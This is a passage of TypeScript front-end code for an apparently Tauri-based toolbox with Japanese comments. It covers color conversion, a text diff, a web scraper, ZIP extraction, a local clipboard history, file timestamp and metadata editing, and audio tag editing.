    return [Math.round(h), Math.round(s * 100), Math.round(l * 100)];
  };
  const hslToRgb = (
    h: number,
    s: number,
    l: number,
  ): [number, number, number] => {
    s /= 100;
    l /= 100;
    const k = (n: number): number => (n + h / 30) % 12;
    const a = s * Math.min(l, 1 - l);
    const f = (n: number): number =>
      l - a * Math.max(-1, Math.min(k(n) - 3, Math.min(9 - k(n), 1)));
    return [
      Math.round(f(0) * 255),
      Math.round(f(8) * 255),
      Math.round(f(4) * 255),
    ];
  };
  const apply = (r: number, g: number, b: number): void => {
    const cl = (x: number): number => Math.max(0, Math.min(255, Math.round(x)));
    r = cl(r);
    g = cl(g);
    b = cl(b);
    const h = `#${[r, g, b].map((x) => x.toString(16).padStart(2, "0")).join("")}`;
    const [hh, ss, ll] = rgbToHsl(r, g, b);
    updating = true;
    hex.value = h;
    rgb.value = `rgb(${r}, ${g}, ${b})`;
    hsl.value = `hsl(${hh}, ${ss}%, ${ll}%)`;
    picker.value = h;
    swatch.style.background = h;
    if (status) {
      status.textContent = "";
      status.classList.remove("toolbox-error");
    }
    updating = false;
  };
  const err = (msg: string): void => {
    if (status) {
      status.textContent = msg;
      status.classList.add("toolbox-error");
    }
  };
  hex.addEventListener("input", () => {
    if (updating) return;
    let v = hex.value.trim().replace(/^#/, "");
    if (v.length === 3)
      v = v
        .split("")
        .map((c) => c + c)
        .join("");
    if (!/^[0-9a-fA-F]{6}$/.test(v)) {
      err("HEX 不正");
      return;
    }
    apply(
      parseInt(v.slice(0, 2), 16),
      parseInt(v.slice(2, 4), 16),
      parseInt(v.slice(4, 6), 16),
    );
  });
  rgb.addEventListener("input", () => {
    if (updating) return;
    const m = rgb.value.match(/(\d+)\s*,\s*(\d+)\s*,\s*(\d+)/);
    if (!m) {
      err("RGB 不正");
      return;
    }
    apply(+m[1], +m[2], +m[3]);
  });
  hsl.addEventListener("input", () => {
    if (updating) return;
    const m = hsl.value.match(
      /(-?\d+(?:\.\d+)?)\s*,\s*(-?\d+(?:\.\d+)?)%?\s*,\s*(-?\d+(?:\.\d+)?)%?/,
    );
    if (!m) {
      err("HSL 不正");
      return;
    }
    const [r, g, b] = hslToRgb(+m[1], +m[2], +m[3]);
    apply(r, g, b);
  });
  picker.addEventListener("input", () => {
    if (updating) return;
    const v = picker.value.replace(/^#/, "");
    apply(
      parseInt(v.slice(0, 2), 16),
      parseInt(v.slice(2, 4), 16),
      parseInt(v.slice(4, 6), 16),
    );
  });
  apply(47, 111, 219);
}

// テキスト Diff (行単位 LCS)
function setupDiffTool(): void {
  const left = $id<HTMLTextAreaElement>("diff-left");
  const right = $id<HTMLTextAreaElement>("diff-right");
  const run = $id<HTMLButtonElement>("diff-run");
  const out = $id<HTMLPreElement>("diff-output");
  const status = $id<HTMLSpanElement>("diff-status");
  if (!left || !right || !run || !out) return;
  const escapeHtml = (s: string): string =>
    s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const diff = (): void => {
    const a = left.value.split("\n");
    const b = right.value.split("\n");
    const n = a.length;
    const m = b.length;
    // LCS DP (O(n*m) メモリ: 1500*1500 上限を目安に)
    const limit = 1500;
    if (n > limit || m > limit) {
      if (status) status.textContent = `行数が多すぎます (上限 ${limit})`;
      return;
    }
    const dp: Uint16Array = new Uint16Array((n + 1) * (m + 1));
    const w = m + 1;
    for (let i = n - 1; i >= 0; i--) {
      for (let j = m - 1; j >= 0; j--) {
        if (a[i] === b[j]) dp[i * w + j] = dp[(i + 1) * w + (j + 1)] + 1;
        else dp[i * w + j] = Math.max(dp[(i + 1) * w + j], dp[i * w + (j + 1)]);
      }
    }
    let i = 0;
    let j = 0;
    let html = "";
    let added = 0;
    let removed = 0;
    while (i < n && j < m) {
      if (a[i] === b[j]) {
        html += `  ${escapeHtml(a[i])}\n`;
        i++;
        j++;
      } else if (dp[(i + 1) * w + j] >= dp[i * w + (j + 1)]) {
        html += `<span class="diff-del">- ${escapeHtml(a[i])}</span>\n`;
        i++;
        removed++;
      } else {
        html += `<span class="diff-add">+ ${escapeHtml(b[j])}</span>\n`;
        j++;
        added++;
      }
    }
    while (i < n) {
      html += `<span class="diff-del">- ${escapeHtml(a[i++])}</span>\n`;
      removed++;
    }
    while (j < m) {
      html += `<span class="diff-add">+ ${escapeHtml(b[j++])}</span>\n`;
      added++;
    }
    out.innerHTML = html;
    if (status) status.textContent = `+${added} / -${removed}`;
  };
  run.addEventListener("click", diff);
}

// User-Agent / ブラウザ情報
function setupUserAgentTool(): void {
  const ua = $id<HTMLPreElement>("ua-string");
  const lang = $id<HTMLPreElement>("ua-lang");
  const plat = $id<HTMLPreElement>("ua-platform");
  const scr = $id<HTMLPreElement>("ua-screen");
  const tz = $id<HTMLPreElement>("ua-tz");
  const online = $id<HTMLPreElement>("ua-online");
  if (ua) ua.textContent = navigator.userAgent;
  if (lang)
    lang.textContent = `${navigator.language} (${(navigator.languages || []).join(", ")})`;
  if (plat) plat.textContent = navigator.platform;
  if (scr)
    scr.textContent = `${screen.width}x${screen.height} @ DPR ${window.devicePixelRatio}`;
  if (tz) tz.textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
  if (online) online.textContent = navigator.onLine ? "online" : "offline";
}

// ===== スクレイピング =====
interface ScrapeResult {
  status: number;
  content_type: string;
  body: string;
  bytes: number;
}

let scrapeLastBody = "";

function setupScrapeTool(): void {
  const url = $id<HTMLInputElement>("scrape-url");
  const ua = $id<HTMLInputElement>("scrape-ua");
  const fillCur = $id<HTMLButtonElement>("scrape-fill-current");
  const fetchBtn = $id<HTMLButtonElement>("scrape-fetch");
  const status = $id<HTMLSpanElement>("scrape-status");
  const sel = $id<HTMLInputElement>("scrape-selector");
  const extract = $id<HTMLSelectElement>("scrape-extract");
  const apply = $id<HTMLButtonElement>("scrape-apply");
  const out = $id<HTMLPreElement>("scrape-output");
  const raw = $id<HTMLTextAreaElement>("scrape-raw");
  if (!url || !fetchBtn || !out || !raw) return;

  fillCur?.addEventListener("click", () => {
    const a = activeTab();
    if (a) url.value = a.url;
  });

  fetchBtn.addEventListener("click", async () => {
    if (!url.value.trim()) {
      if (status) status.textContent = "URL を入力してください";
      return;
    }
    fetchBtn.disabled = true;
    if (status) status.textContent = "取得中…";
    try {
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url: url.value.trim(),
        userAgent: ua?.value.trim() || null,
      });
      scrapeLastBody = r.body;
      raw.value = r.body;
      out.textContent = "";
      if (status)
        status.textContent = `HTTP ${r.status} / ${r.content_type} / ${r.bytes} bytes`;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    } finally {
      fetchBtn.disabled = false;
    }
  });

  apply?.addEventListener("click", () => {
    if (!scrapeLastBody) {
      if (status) status.textContent = "先に取得してください";
      return;
    }
    const q = sel?.value.trim() || "";
    if (!q) {
      out.textContent = scrapeLastBody.slice(0, 100000);
      return;
    }
    try {
      const doc = new DOMParser().parseFromString(scrapeLastBody, "text/html");
      const nodes = doc.querySelectorAll(q);
      const mode = extract?.value || "text";
      const lines: string[] = [];
      nodes.forEach((n, i) => {
        const el = n as Element;
        let v = "";
        switch (mode) {
          case "html":
            v = el.innerHTML;
            break;
          case "outer":
            v = el.outerHTML;
            break;
          case "href":
            v = el.getAttribute("href") || "";
            break;
          case "src":
            v = el.getAttribute("src") || "";
            break;
          default:
            v = el.textContent?.trim() || "";
        }
        lines.push(`[${i}] ${v}`);
      });
      out.textContent = lines.length === 0 ? "(マッチなし)" : lines.join("\n");
      if (status) status.textContent = `${nodes.length} 件マッチ`;
    } catch (e) {
      if (status) status.textContent = `セレクタエラー: ${String(e)}`;
    }
  });
}

// ===== ZIP 解凍 =====
interface ExtractResult {
  files: number;
  bytes: number;
  dest: string;
}

function setupUnzipTool(): void {
  const src = $id<HTMLInputElement>("unzip-src");
  const dest = $id<HTMLInputElement>("unzip-dest");
  const pickSrc = $id<HTMLButtonElement>("unzip-pick-src");
  const pickDest = $id<HTMLButtonElement>("unzip-pick-dest");
  const run = $id<HTMLButtonElement>("unzip-run");
  const open = $id<HTMLButtonElement>("unzip-open");
  const status = $id<HTMLSpanElement>("unzip-status");
  if (!src || !dest || !run) return;

  pickSrc?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_archive", {
        initial: src.value || null,
      });
      if (chosen) src.value = chosen;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });

  pickDest?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial: dest.value || null,
      });
      if (chosen) dest.value = chosen;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });

  run.addEventListener("click", async () => {
    if (!src.value.trim() || !dest.value.trim()) {
      if (status) status.textContent = "ZIP と出力先を指定してください";
      return;
    }
    run.disabled = true;
    if (status) status.textContent = "解凍中…";
    try {
      const r = await invoke<ExtractResult>("toolbox_extract_archive", {
        archivePath: src.value.trim(),
        destDir: dest.value.trim(),
      });
      if (status)
        status.textContent = `${r.files} ファイル / ${r.bytes} bytes → ${r.dest}`;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    } finally {
      run.disabled = false;
    }
  });

  open?.addEventListener("click", async () => {
    if (!dest.value.trim()) return;
    try {
      await invoke("toolbox_open_path", { path: dest.value.trim() });
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== クリップボード履歴 =====
type ClipMode = "lifo" | "fifo" | "unique" | "stack";
interface ClipEntry {
  text: string;
  ts: number;
  pinned?: boolean;
}
interface ClipSettings {
  mode: ClipMode;
  capacity: number;
  watch: boolean;
  noEmpty: boolean;
  trim: boolean;
}
const CLIP_KEY = "yuzu.clipboardHistory.v1";
const CLIP_SETTINGS_KEY = "yuzu.clipboardSettings.v1";
const DEFAULT_CLIP_SETTINGS: ClipSettings = {
  mode: "lifo",
  capacity: 100,
  watch: false,
  noEmpty: true,
  trim: false,
};

function clipLoad(): ClipEntry[] {
  try {
    const raw = localStorage.getItem(CLIP_KEY);
    if (!raw) return [];
    const v = JSON.parse(raw);
    if (Array.isArray(v)) return v as ClipEntry[];
  } catch {
    /* noop */
  }
  return [];
}

function clipSave(list: ClipEntry[]): void {
  try {
    localStorage.setItem(CLIP_KEY, JSON.stringify(list));
  } catch {
    /* noop */
  }
}

function clipLoadSettings(): ClipSettings {
  try {
    const raw = localStorage.getItem(CLIP_SETTINGS_KEY);
    if (raw) {
      return { ...DEFAULT_CLIP_SETTINGS, ...JSON.parse(raw) };
    }
  } catch {
    /* noop */
  }
  return { ...DEFAULT_CLIP_SETTINGS };
}

function clipSaveSettings(s: ClipSettings): void {
  try {
    localStorage.setItem(CLIP_SETTINGS_KEY, JSON.stringify(s));
  } catch {
    /* noop */
  }
}

function setupClipboardTool(): void {
  const cap = $id<HTMLButtonElement>("clip-capture");
  const addManual = $id<HTMLButtonElement>("clip-add-manual");
  const clear = $id<HTMLButtonElement>("clip-clear");
  const clearUnpinned = $id<HTMLButtonElement>("clip-clear-unpinned");
  const exportBtn = $id<HTMLButtonElement>("clip-export");
  const importBtn = $id<HTMLButtonElement>("clip-import");
  const importFile = $id<HTMLInputElement>("clip-import-file");
  const input = $id<HTMLTextAreaElement>("clip-input");
  const list = $id<HTMLUListElement>("clip-list");
  const status = $id<HTMLSpanElement>("clip-status");
  const countEl = $id<HTMLSpanElement>("clip-count");
  const modeSel = $id<HTMLSelectElement>("clip-mode");
  const capInput = $id<HTMLInputElement>("clip-capacity");
  const watchEl = $id<HTMLInputElement>("clip-watch");
  const noEmptyEl = $id<HTMLInputElement>("clip-no-empty");
  const trimEl = $id<HTMLInputElement>("clip-trim");
  const searchEl = $id<HTMLInputElement>("clip-search");
  if (!list) return;

  let history: ClipEntry[] = clipLoad();
  let settings: ClipSettings = clipLoadSettings();
  let watchTimer: number | null = null;
  let lastWatched: string | null = null;
  let searchQuery = "";

  // 初期 UI 反映
  if (modeSel) modeSel.value = settings.mode;
  if (capInput) capInput.value = String(settings.capacity);
  if (watchEl) watchEl.checked = settings.watch;
  if (noEmptyEl) noEmptyEl.checked = settings.noEmpty;
  if (trimEl) trimEl.checked = settings.trim;

  const persistSettings = (): void => clipSaveSettings(settings);

  const compileSearch = (): ((s: string) => boolean) => {
    if (!searchQuery) return () => true;
    const m = searchQuery.match(/^\/(.+)\/([gimsuy]*)$/);
    if (m) {
      try {
        const re = new RegExp(m[1], m[2]);
        return (s) => re.test(s);
      } catch {
        /* fallthrough */
      }
    }
    const lower = searchQuery.toLowerCase();
    return (s) => s.toLowerCase().includes(lower);
  };

  const trimText = (s: string): string => (settings.trim ? s.trim() : s);

  const enforceCapacity = (): void => {
    const cap = Math.max(1, settings.capacity);
    if (history.length <= cap) return;
    // ピンは保護: 上限超過分を末尾の非ピンから削除する
    const newest = settings.mode === "fifo" ? "tail" : "head";
    while (history.length > cap) {
      let idx = -1;
      if (newest === "head") {
        for (let i = history.length - 1; i >= 0; i--) {
          if (!history[i].pinned) {
            idx = i;
            break;
          }
        }
      } else {
        for (let i = 0; i < history.length; i++) {
          if (!history[i].pinned) {
            idx = i;
            break;
          }
        }
      }
      if (idx < 0) break; // 全ピン
      history.splice(idx, 1);
    }
  };

  const render = (): void => {
    list.innerHTML = "";
    const filter = compileSearch();
    const view = settings.mode === "fifo" ? history : history.slice().reverse();
    // mode=fifo は配列順 (古い→新しい) で表示
    // mode=lifo/unique/stack は新しい→古いで表示 (history 配列は常に古い→新しい)
    let shown = 0;
    if (view.length === 0) {
      const li = document.createElement("li");
      li.className = "clip-meta";
      li.textContent = "(履歴なし)";
      list.appendChild(li);
    } else {
      view.forEach((e) => {
        if (!filter(e.text)) return;
        shown++;
        const li = document.createElement("li");
        if (e.pinned) li.classList.add("pinned");
        const text = document.createElement("div");
        text.className = "clip-text";
        text.textContent = e.text;
        const meta = document.createElement("div");
        meta.className = "clip-meta";
        meta.textContent = `${new Date(e.ts).toLocaleString()}\n${e.text.length} 文字`;
        const copyBtn = document.createElement("button");
        copyBtn.type = "button";
        copyBtn.textContent = "コピー";
        copyBtn.addEventListener("click", () => {
          void navigator.clipboard.writeText(e.text);
          if (status) status.textContent = "コピーしました";
          lastWatched = e.text;
        });
        const pinBtn = document.createElement("button");
        pinBtn.type = "button";
        pinBtn.textContent = e.pinned ? "ピン解除" : "ピン";
        pinBtn.addEventListener("click", () => {
          e.pinned = !e.pinned;
          clipSave(history);
          render();
        });
        const delBtn = document.createElement("button");
        delBtn.type = "button";
        delBtn.textContent = "削除";
        delBtn.addEventListener("click", () => {
          const idx = history.indexOf(e);
          if (idx >= 0) history.splice(idx, 1);
          clipSave(history);
          render();
        });
        li.appendChild(text);
        li.appendChild(meta);
        li.appendChild(copyBtn);
        li.appendChild(pinBtn);
        li.appendChild(delBtn);
        list.appendChild(li);
      });
    }
    if (countEl) {
      const total = history.length;
      countEl.textContent =
        searchQuery && shown !== total ? `${shown}/${total}` : `${total} 件`;
    }
  };

  const push = (raw: string): boolean => {
    let t = trimText(raw);
    if (settings.noEmpty && !t) return false;
    // 重複処理
    if (settings.mode === "unique" || settings.mode === "stack") {
      // 既存と同一なら、古い方を消して末尾に再追加 (最近使った順を維持)
      const existing = history.findIndex((e) => e.text === t);
      if (existing >= 0) {
        const [e] = history.splice(existing, 1);
        e.ts = Date.now();
        history.push(e);
        enforceCapacity();
        clipSave(history);
        return true;
      }
    } else if (settings.mode === "lifo" || settings.mode === "fifo") {
      // 直近と完全一致は無視 (連続コピー対策)
      const last = history[history.length - 1];
      if (last && last.text === t) return false;
    }
    history.push({ text: t, ts: Date.now() });
    enforceCapacity();
    clipSave(history);
    return true;
  };

  const startWatch = (): void => {
    if (watchTimer != null) return;
    watchTimer = window.setInterval(async () => {
      if (!document.hasFocus()) return;
      try {
        const t = await navigator.clipboard.readText();
        if (t === lastWatched) return;
        lastWatched = t;
        if (push(t)) render();
      } catch {
        /* 権限なし: 静かに */
      }
    }, 1000);
  };
  const stopWatch = (): void => {
    if (watchTimer != null) {
      window.clearInterval(watchTimer);
      watchTimer = null;
    }
  };

  modeSel?.addEventListener("change", () => {
    settings.mode = (modeSel.value as ClipMode) || "lifo";
    persistSettings();
    render();
  });
  capInput?.addEventListener("change", () => {
    const v = parseInt(capInput.value, 10);
    settings.capacity = Math.max(1, Math.min(10000, isFinite(v) ? v : 100));
    capInput.value = String(settings.capacity);
    persistSettings();
    enforceCapacity();
    clipSave(history);
    render();
  });
  watchEl?.addEventListener("change", () => {
    settings.watch = watchEl.checked;
    persistSettings();
    if (settings.watch) startWatch();
    else stopWatch();
    if (status)
      status.textContent = settings.watch
        ? "自動監視を開始しました (このウィンドウがフォーカス時のみ)"
        : "自動監視を停止しました";
  });
  noEmptyEl?.addEventListener("change", () => {
    settings.noEmpty = noEmptyEl.checked;
    persistSettings();
  });
  trimEl?.addEventListener("change", () => {
    settings.trim = trimEl.checked;
    persistSettings();
  });
  searchEl?.addEventListener("input", () => {
    searchQuery = searchEl.value;
    render();
  });

  cap?.addEventListener("click", async () => {
    try {
      const t = await navigator.clipboard.readText();
      if (push(t)) {
        render();
        if (status) status.textContent = `${t.length} 文字を追加`;
      } else if (status) {
        status.textContent = "追加されませんでした (重複/空など)";
      }
    } catch (e) {
      if (status)
        status.textContent = `読取失敗 (権限が必要かもしれません): ${String(e)}`;
    }
  });
  addManual?.addEventListener("click", () => {
    if (input && input.value) {
      if (push(input.value)) {
        render();
        if (status) status.textContent = `${input.value.length} 文字を追加`;
        input.value = "";
      } else if (status) {
        status.textContent = "追加されませんでした (重複/空など)";
      }
    }
  });
  clearUnpinned?.addEventListener("click", () => {
    if (!confirm("ピン以外を削除しますか?")) return;
    history = history.filter((e) => e.pinned);
    clipSave(history);
    render();
  });
  clear?.addEventListener("click", () => {
    if (!confirm("ピンを含めすべて削除しますか?")) return;
    history = [];
    clipSave(history);
    render();
  });

  exportBtn?.addEventListener("click", () => {
    const blob = new Blob([JSON.stringify({ settings, history }, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `clipboard-history-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  });
  importBtn?.addEventListener("click", () => importFile?.click());
  importFile?.addEventListener("change", () => {
    const f = importFile.files?.[0];
    if (!f) return;
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const obj = JSON.parse(String(reader.result));
        if (Array.isArray(obj)) {
          // 旧形式 (配列のみ)
          history = obj.filter(
            (e) => e && typeof e.text === "string",
          ) as ClipEntry[];
        } else if (obj && Array.isArray(obj.history)) {
          history = obj.history.filter(
            (e: unknown): e is ClipEntry =>
              typeof (e as ClipEntry)?.text === "string",
          );
          if (obj.settings) {
            settings = { ...DEFAULT_CLIP_SETTINGS, ...obj.settings };
            persistSettings();
            if (modeSel) modeSel.value = settings.mode;
            if (capInput) capInput.value = String(settings.capacity);
            if (watchEl) watchEl.checked = settings.watch;
            if (noEmptyEl) noEmptyEl.checked = settings.noEmpty;
            if (trimEl) trimEl.checked = settings.trim;
          }
        } else {
          throw new Error("形式が不正");
        }
        enforceCapacity();
        clipSave(history);
        render();
        if (status) status.textContent = `${history.length} 件をインポート`;
      } catch (e) {
        if (status) status.textContent = `インポート失敗: ${String(e)}`;
      }
      importFile.value = "";
    };
    reader.readAsText(f);
  });

  if (settings.watch) startWatch();
  render();
}

// ===== ファイルメタデータ =====
interface FileMetaInfo {
  path: string;
  size: number;
  mtime: number | null;
  atime: number | null;
  ctime: number | null;
  image_info: { label: string; value: string }[];
}

function unixToLocalInput(unix: number | null): string {
  if (unix == null) return "";
  const d = new Date(unix * 1000);
  const pad = (n: number): string => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}T${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

function localInputToUnix(v: string): number | null {
  if (!v) return null;
  const d = new Date(v);
  if (Number.isNaN(d.getTime())) return null;
  return Math.floor(d.getTime() / 1000);
}

function setupFileMetaTool(): void {
  const path = $id<HTMLInputElement>("fm-path");
  const pick = $id<HTMLButtonElement>("fm-pick");
  const reload = $id<HTMLButtonElement>("fm-reload");
  const sizeEl = $id<HTMLPreElement>("fm-size");
  const mtimeEl = $id<HTMLInputElement>("fm-mtime");
  const atimeEl = $id<HTMLInputElement>("fm-atime");
  const setBtn = $id<HTMLButtonElement>("fm-set-times");
  const stripBtn = $id<HTMLButtonElement>("fm-strip");
  const status = $id<HTMLSpanElement>("fm-status");
  const imgEl = $id<HTMLPreElement>("fm-image");
  if (!path || !sizeEl || !mtimeEl || !atimeEl || !imgEl) return;

  const load = async (): Promise<void> => {
    if (!path.value.trim()) return;
    try {
      const r = await invoke<FileMetaInfo>("toolbox_get_file_meta", {
        path: path.value.trim(),
      });
      const ctime =
        r.ctime != null ? new Date(r.ctime * 1000).toLocaleString() : "(不明)";
      sizeEl.textContent = `${r.size.toLocaleString()} bytes  /  作成: ${ctime}`;
      mtimeEl.value = unixToLocalInput(r.mtime);
      atimeEl.value = unixToLocalInput(r.atime);
      imgEl.textContent =
        r.image_info.length === 0
          ? "(画像メタなし、または対象外)"
          : r.image_info.map((e) => `${e.label}\t${e.value}`).join("\n");
      if (status) status.textContent = "読み込みました";
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  };

  pick?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_file", {
        initial: path.value || null,
      });
      if (chosen) {
        path.value = chosen;
        await load();
      }
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });
  reload?.addEventListener("click", () => void load());

  setBtn?.addEventListener("click", async () => {
    if (!path.value.trim()) return;
    try {
      await invoke("toolbox_set_file_times", {
        path: path.value.trim(),
        mtime: localInputToUnix(mtimeEl.value),
        atime: localInputToUnix(atimeEl.value),
      });
      if (status) status.textContent = "時刻を更新しました";
      await load();
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });

  stripBtn?.addEventListener("click", async () => {
    if (!path.value.trim()) return;
    const p = path.value.trim();
    const dot = p.lastIndexOf(".");
    const dest =
      dot > 0 ? `${p.slice(0, dot)}_clean${p.slice(dot)}` : `${p}_clean`;
    try {
      const out = await invoke<string>("toolbox_strip_image_meta", {
        path: p,
        dest,
      });
      if (status) status.textContent = `保存: ${out}`;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 音声タグ (lofty バックエンド経由) =====
interface AudioTagData {
  format?: string;
  tagType?: string;
  title?: string | null;
  artist?: string | null;
  album?: string | null;
  albumArtist?: string | null;
  year?: number | null;
  genre?: string | null;
  composer?: string | null;
  publisher?: string | null;
  track?: number | null;
  totalTracks?: number | null;
  disc?: number | null;
  totalDiscs?: number | null;
  bpm?: string | null;
  key?: string | null;
  lang?: string | null;
  isrc?: string | null;
  encodedBy?: string | null;
  encoderSettings?: string | null;
  copyright?: string | null;
  grouping?: string | null;
  subtitle?: string | null;
  conductor?: string | null;
  remixer?: string | null;
  origArtist?: string | null;
  origAlbum?: string | null;
  url?: string | null;
  comment?: string | null;
  lyrics?: string | null;
  hasPicture?: boolean;
  pictureMime?: string | null;
  pictureSize?: number | null;
  durationSecs?: number | null;
  bitrate?: number | null;
  sampleRate?: number | null;
  channels?: number | null;
}

const AUDIO_EXTS = new Set([
  "mp3",
  "wav",
  "wave",
  "flac",
  "ogg",
  "oga",
  "opus",
  "spx",
  "m4a",
  "m4b",
  "m4p",
  "mp4",
  "aac",
  "aiff",
  "aif",
  "aifc",
  "ape",
  "wv",
  "mpc",
]);

function setupAudioTagsTool(): void {
  const pathEl = $id<HTMLInputElement>("fm-path");
  const status = $id<HTMLSpanElement>("fm-status");
  const saveBtn = $id<HTMLButtonElement>("id3-save");
  const clearBtn = $id<HTMLButtonElement>("id3-clear-all");
  const artChange = $id<HTMLButtonElement>("id3-art-change");
  const artRemove = $id<HTMLButtonElement>("id3-art-remove");
  const artInfo = $id<HTMLPreElement>("id3-art-info");
  if (!pathEl || !saveBtn) return;

  const fields: Record<string, string> = {
    title: "id3-title",
    artist: "id3-artist",
    album: "id3-album",
    albumArtist: "id3-album-artist",
    year: "id3-year",
    genre: "id3-genre",
    composer: "id3-composer",
    publisher: "id3-publisher",
    track: "id3-track",
    totalTracks: "id3-total-tracks",
    disc: "id3-disc",
    totalDiscs: "id3-total-discs",
    bpm: "id3-bpm",
    key: "id3-key",
    lang: "id3-lang",
    isrc: "id3-isrc",
    encodedBy: "id3-encoded-by",
    encoderSettings: "id3-encoder-settings",
    copyright: "id3-copyright",
    grouping: "id3-grouping",
    subtitle: "id3-subtitle",
    conductor: "id3-conductor",
    remixer: "id3-remixer",
    origArtist: "id3-orig-artist",
    origAlbum: "id3-orig-album",
    url: "id3-url",
    comment: "id3-comment",
    lyrics: "id3-lyrics",
  };
  const numericFields = new Set([
    "year",
    "track",
    "totalTracks",
    "disc",
    "totalDiscs",
  ]);

  const isAudio = (p: string): boolean => {
    const dot = p.lastIndexOf(".");
    if (dot < 0) return false;
    return AUDIO_EXTS.has(p.slice(dot + 1).toLowerCase());
  };

  const clearForm = (): void => {
    Object.values(fields).forEach((id) => {
      const el = $id<HTMLInputElement | HTMLTextAreaElement>(id);
      if (el) el.value = "";
    });
    if (artInfo) artInfo.textContent = "(なし)";
  };

  const fillForm = (d: AudioTagData): void => {
    for (const [k, id] of Object.entries(fields)) {
      const el = $id<HTMLInputElement | HTMLTextAreaElement>(id);
      if (!el) continue;
      const v = (d as Record<string, unknown>)[k];
      if (v == null) {
        el.value = "";
      } else {
        el.value = String(v);
      }
    }
    if (artInfo) {
      if (d.hasPicture) {
        const sz = d.pictureSize ?? 0;
        const mime = d.pictureMime ?? "?";
        artInfo.textContent = `${mime}\n${sz.toLocaleString()} bytes`;
      } else {
        artInfo.textContent = "(なし)";
      }
    }
    const fmt = d.format ?? "?";
    const tt = d.tagType ?? "?";
    const dur =
      d.durationSecs != null
        ? `${Math.floor(d.durationSecs / 60)}:${String(d.durationSecs % 60).padStart(2, "0")}`
        : "?";
    const br = d.bitrate != null ? `${d.bitrate} kbps` : "";
    const sr = d.sampleRate != null ? `${d.sampleRate} Hz` : "";
    const ch = d.channels != null ? `${d.channels}ch` : "";
    if (status)
      status.textContent =
        `音声 [${fmt}/${tt}] ${dur} ${br} ${sr} ${ch}`.replace(/\s+/g, " ");
  };

  const collectForm = (): AudioTagData => {
    const out: AudioTagData = {};
    for (const [k, id] of Object.entries(fields)) {
      const el = $id<HTMLInputElement | HTMLTextAreaElement>(id);
      if (!el) continue;
      const v = el.value;
      if (numericFields.has(k)) {
        if (v.trim() === "") {
          (out as Record<string, unknown>)[k] = null;
        } else {
          const n = parseInt(v, 10);
          (out as Record<string, unknown>)[k] = Number.isFinite(n) ? n : null;
        }
      } else {
        (out as Record<string, unknown>)[k] = v;
      }
    }
    return out;
  };

  const load = async (): Promise<void> => {
    const p = pathEl.value.trim();
    if (!p) return;
    if (!isAudio(p)) {
      clearForm();
      return;
    }
    try {
      const d = await invoke<AudioTagData>("toolbox_get_audio_tags", {
        path: p,
      });
      fillForm(d);
    } catch (e) {
      clearForm();
      if (status) status.textContent = `音声タグ読込失敗: ${String(e)}`;
    }
  };

  // fm-path が変わったら自動読込 (input/change/blur)
  pathEl.addEventListener("change", () => void load());
  pathEl.addEventListener("blur", () => void load());
  // ピック後にも反応するよう、再読込ボタンにもフック
  $id<HTMLButtonElement>("fm-pick")?.addEventListener("click", () => {
    setTimeout(() => void load(), 100);
  });
  $id<HTMLButtonElement>("fm-reload")?.addEventListener(
    "click",
    () => void load(),
  );

  saveBtn.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p) {
      if (status) status.textContent = "ファイルを指定してください";
      return;
    }
    if (!isAudio(p)) {
      if (status) status.textContent = "音声ファイルではありません";
      return;
    }
    try {
      const data = collectForm();
      await invoke("toolbox_save_audio_tags", { path: p, data });
      if (status) status.textContent = "音声タグを書き込みました";
      await load();
    } catch (e) {
      if (status) status.textContent = `書込失敗: ${String(e)}`;
    }
  });

  clearBtn?.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p) return;
    if (!isAudio(p)) {
      if (status) status.textContent = "音声ファイルではありません";
      return;
    }
    if (!confirm("このファイルからすべてのタグを削除しますか?")) return;
    try {
      await invoke("toolbox_clear_audio_tags", { path: p });
      if (status) status.textContent = "すべてのタグを削除しました";
      clearForm();
      await load();
    } catch (e) {
      if (status) status.textContent = `削除失敗: ${String(e)}`;
    }
  });

  artChange?.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p || !isAudio(p)) return;
    try {
      const chosen = await invoke<string | null>("toolbox_pick_file", {
        initial: null,
      });
      if (!chosen) return;
      await invoke("toolbox_set_audio_picture", {
        audioPath: p,
        imagePath: chosen,
      });
      if (status) status.textContent = "アルバムアートを設定しました";
      await load();
    } catch (e) {
      if (status) status.textContent = `アート設定失敗: ${String(e)}`;
    }
  });

  artRemove?.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p || !isAudio(p)) return;
    try {
      await invoke("toolbox_remove_audio_picture", { path: p });
      if (status) status.textContent = "アルバムアートを削除しました";
      await load();
    } catch (e) {
      if (status) status.textContent = `アート削除失敗: ${String(e)}`;
    }
  });
}

interface GenericField {
  key: string;
  value: string;
  editable: boolean;
}
interface GenericMeta {
  kind: string;
  editable: boolean;
  fields: GenericField[];
  info: string;
}

function setupGenericMetaTool(): void {
  const pathEl = $id<HTMLInputElement>("fm-path");
